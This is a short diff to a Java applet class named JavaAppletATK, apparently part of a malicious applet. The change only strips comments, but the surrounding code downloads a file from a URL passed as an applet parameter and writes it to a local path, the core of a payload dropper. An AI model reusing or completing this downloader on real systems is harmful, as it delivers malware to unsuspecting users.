@@ -20,11 +20,8 @@ public class JavaAppletATK extends Applet {
 	String download = "";
 	download = getPatameter("1");
 	if (download.length() > 0) {
-		//URL parameter
 		URL url = new URL(download);
-		//Get an input stream for reading
 		InputStream in = url.openStream();
-		//Create a buffered input stream for efficency
 		BufferedInputStream bufIn = new BufferedInputStream(in);
 		File outputFile = new File(expath);
 		OutputStream out = new BufferedOutputStream(new FileOutputStream(outputFile));
